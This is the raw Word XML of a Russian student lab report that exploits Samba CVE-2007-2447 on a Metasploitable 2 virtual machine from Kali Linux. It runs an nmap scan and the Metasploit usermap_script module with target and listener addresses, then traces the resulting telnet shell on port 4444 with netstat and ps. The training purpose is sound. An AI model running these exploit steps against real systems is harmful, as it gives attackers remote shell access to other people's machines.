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Основной текст"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Лабораторная работа №</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">3. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">Использование уязвимости протокола </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Samba: CVE - 2007 - 2447. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Сетевая Форензика</w:t>
      </w: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jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto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>К</w:t>
      </w:r>
      <w:del w:id="0" w:date="2022-06-01T23:15:43Z" w:author="Артем Кондратьев">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
            <w:b w:val="1"/>
            <w:bCs w:val="1"/>
            <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
            <w:rtl w:val="0"/>
            <w:lang w:val="ru-RU"/>
          </w:rPr>
          <w:delText xml:space="preserve">Болатов Диас и Загирова Айдар </w:delText>
        </w:r>
      </w:del>
      <w:del w:id="1" w:date="2022-06-01T23:15:43Z" w:author="Артем Кондратьев">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
            <w:b w:val="1"/>
            <w:bCs w:val="1"/>
            <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
            <w:rtl w:val="0"/>
          </w:rPr>
          <w:delText>11-911</w:delText>
        </w:r>
      </w:del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ондратьев Артём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>11-901</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Основной текст"/>
        <w:jc w:val="center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 xml:space="preserve">1)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Создание виртуальной машины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 xml:space="preserve">Kali Linux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и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 xml:space="preserve">Metasploitable 2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>было выполнено в рамках предыдущих лабораторных работ</w:t>
      </w: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2"/>
        </w:numPr>
        <w:bidi w:val="0"/>
        <w:ind w:right="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
        <w:t>Kali Linux 2021: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874940" cy="2697010"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741825" name="officeArt object" descr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2.png" descr="image2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940" cy="26970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4"/>
        </w:numPr>
        <w:bidi w:val="0"/>
        <w:ind w:right="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
        <w:t>Metasploitable 2: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871084" cy="2675035"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741826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1.png" descr="image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084" cy="26750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 xml:space="preserve">2)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Настройка сети между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 xml:space="preserve">Metasploitable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и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 xml:space="preserve">Kali Linux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>и проверка соединения</w:t>
      </w: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6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Узнаем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ip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адрес </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
        <w:t xml:space="preserve">Metasploitable,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используя команду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de-DE"/>
        </w:rPr>
        <w:t>ifconfig -a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 или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>ip addr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767138" cy="2651729"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741827" name="officeArt object" descr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7.png" descr="image7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26517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6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Узнаем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ip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адрес </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
        <w:t xml:space="preserve">Kali Linux,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используя команду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de-DE"/>
        </w:rPr>
        <w:t>ifconfig -a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 или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>ip addr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790065" cy="2069018"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741828" name="officeArt object" descr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18.png" descr="image18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065" cy="20690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6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Выполним проверку корректности соединения с помощью команды </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ping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862388" cy="1430753"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741829" name="officeArt object" descr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15.png" descr="image15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14307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890963" cy="697872"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741830" name="officeArt object" descr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5.png" descr="image5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6978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</w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Основной текст"/>
        <w:ind w:left="720" w:firstLine="0"/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 xml:space="preserve">3)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Атака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 xml:space="preserve">Metasploitable.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Проверка портов через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de-DE"/>
        </w:rPr>
        <w:t>NMAP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Основной текст"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:spacing w:before="240" w:after="240"/>
        <w:rPr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Сканирование портов </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
        <w:t xml:space="preserve">Metasploitable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с помощью </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="de-DE"/>
        </w:rPr>
        <w:t xml:space="preserve">NMAP.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Выполним команду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 xml:space="preserve">nmap -p 1-65535 -T4 -A -v </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t>192.168.50.121</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">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de-DE"/>
        </w:rPr>
        <w:t>2&gt;&amp;1 | tee /var/tmp/scan.txt</w:t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i w:val="1"/>
          <w:iCs w:val="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
        </w:rPr>
        <w:drawing xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="3784481" cy="1852613"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741831" name="officeArt object" descr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13.png" descr="image13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481" cy="18526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786188" cy="3160049"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741832" name="officeArt object" descr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23.png" descr="image23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31600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792453" cy="1354448"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741833" name="officeArt object" descr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17.png" descr="image17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453" cy="13544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800475" cy="1357313"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741834" name="officeArt object" descr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11.png" descr="image11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3573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И т</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t>.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д</w:t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Конечный вывод работы </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="de-DE"/>
        </w:rPr>
        <w:t>NMAP:</w:t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843338" cy="1244935"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741835" name="officeArt object" descr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12.png" descr="image12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12449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numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:bidi w:val="0"/>
        <w:spacing w:before="240" w:after="24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Теперь нужно убедиться в том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что </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
        <w:t xml:space="preserve">distcc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запущен на порту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3632,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используя для этого команду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grep 3632 /var/tmp/scan.txt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
        </w:rPr>
        <w:drawing xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="3871913" cy="565994"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741836" name="officeArt object" descr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8.png" descr="image8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5659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8"/>
        </w:numPr>
        <w:bidi w:val="0"/>
        <w:spacing w:before="240" w:after="24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Убедимся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что файл </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">scan.txt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сохранился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.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Для этого перейдем в раздел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cd /var/tmp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 и откроем файл через команду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cat scan.txt</w:t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i w:val="1"/>
          <w:iCs w:val="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
        </w:rPr>
        <w:drawing xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="3897258" cy="2821857"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741837" name="officeArt object" descr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24.png" descr="image24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258" cy="28218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 xml:space="preserve">4)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Атака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 xml:space="preserve">Metasploitable.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Активация эксплоита для использования уязвимости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>CVE - 2007 - 2447</w:t>
      </w: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numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10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Перейдем в раздел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cd /var/tmp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 и с помощью команды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grep -i samba /var/tmp/scan.txt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 найдем упоминания о </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t>Samba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160983" cy="1066430"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741838" name="officeArt object" descr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9.png" descr="image9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983" cy="1066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10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В терминале атакующей машины запустим консоль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it-IT"/>
        </w:rPr>
        <w:t>msfconsol</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Основной текст"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10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Выведем список эксплойтов по использованию уязвимостей пакета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samba,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имеющихся во фреймворке </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
        <w:t xml:space="preserve">metasploit,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с помощью команды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>search samb</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
        </w:rPr>
        <w:drawing xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="4252913" cy="1815613"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741839" name="officeArt object" descr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20.png" descr="image20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18156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i w:val="1"/>
          <w:iCs w:val="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Основной текст"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10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Запустим эксплоит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позволяющий использовать уязвимость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CVE - 2007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–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2447,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с помощью команды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fr-FR"/>
        </w:rPr>
        <w:t>use exploit/multi/samba/usermap_script</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Основной текст"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10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Выведем список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payload,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доступных для данного эксплоита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выполнив команду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>show payloads</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Основной текст"/>
        <w:ind w:left="720" w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
        </w:rPr>
        <w:drawing xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="4310997" cy="1909569"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741840" name="officeArt object" descr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16.png" descr="image16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997" cy="19095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10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Для вывода списка доступных опций для эксплоита используем команду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>show options</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Основной текст"/>
        <w:ind w:left="720" w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
        </w:rPr>
        <w:drawing xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="4170522" cy="1752728"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741841" name="officeArt object" descr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4.png" descr="image14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522" cy="17527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i w:val="1"/>
          <w:iCs w:val="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Основной текст"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10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Установим значения параметров следующим образом</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">: set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RHOST 192.168.50.121, set RPORT 139, set LHOST 192.168.50.142</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
        </w:rPr>
        <w:drawing xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="4224338" cy="1789379"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741842" name="officeArt object" descr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4.png" descr="image4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17893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i w:val="1"/>
          <w:iCs w:val="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Основной текст"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10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Активируем эксплоит командой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fr-FR"/>
        </w:rPr>
        <w:t>exploit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 и убедимся в успешности атаки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определив имя хоста </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t>(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имя машины</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t>-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жертвы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),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информацию о ядре операционной системы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о системном пользователе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от чьего имени осуществлено соединение с системой</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t>.</w:t>
      </w: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291013" cy="1290155"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741843" name="officeArt object" descr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21.png" descr="image21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12901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 xml:space="preserve">5)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>Форензика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 xml:space="preserve">.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>Выявление аномальной активности на машине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>-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>жертве</w:t>
      </w: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numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12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Повысим привилегии до привилегий супер</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t>-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пользователя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pt-PT"/>
        </w:rPr>
        <w:t>sudo su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numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12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Осуществим поиск аномальной активности с помощью утилиты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netstat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– определим перечень «подозрительно» открытых портов и системных процессов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работающих на этих портах и будем сохранять все в файл </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>samba.txt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081463" cy="569704"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741844" name="officeArt object" descr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22.png" descr="image22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5697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12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Выполним анализ таких системных процессов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результатом анализа должно быть обнаружение «подозрительного» соединения – </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t>IP-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адреса и порта «атакующего»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.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Команда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netstat -naop | grep 4444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103409" cy="2283458"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741845" name="officeArt object" descr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10.png" descr="image10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409" cy="22834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12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Выполним анализ системных процессов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инициированных «атакующим» и работающих с портом «атакующего» </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t>(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анализ выполнить по определенному на предыдущем шаге номеру порта «атакующего»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),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результатом должно быть обнаружение передачи </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="de-DE"/>
        </w:rPr>
        <w:t>sh-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консоли средствами </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="de-DE"/>
        </w:rPr>
        <w:t xml:space="preserve">telnet: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ps -eaf | grep 4444</w:t>
      </w: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129088" cy="1316918"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741846" name="officeArt object" descr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6.png" descr="image6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13169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 xml:space="preserve">6)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>Оформление результатов работы</w:t>
      </w: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numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14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Последовательно выведем в консоль «жертвы» результаты выполнения следующих команд и сделаем один </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t>(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или два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)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скриншота</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t>: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Команды</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Основной текст"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
        <w:bidi w:val="0"/>
        <w:ind w:right="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>date;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Основной текст"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
        <w:bidi w:val="0"/>
        <w:ind w:right="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="es-ES_tradnl"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="es-ES_tradnl"/>
        </w:rPr>
        <w:t>echo "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Ф</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t>.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И</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t>.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О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.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проводившего работу</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
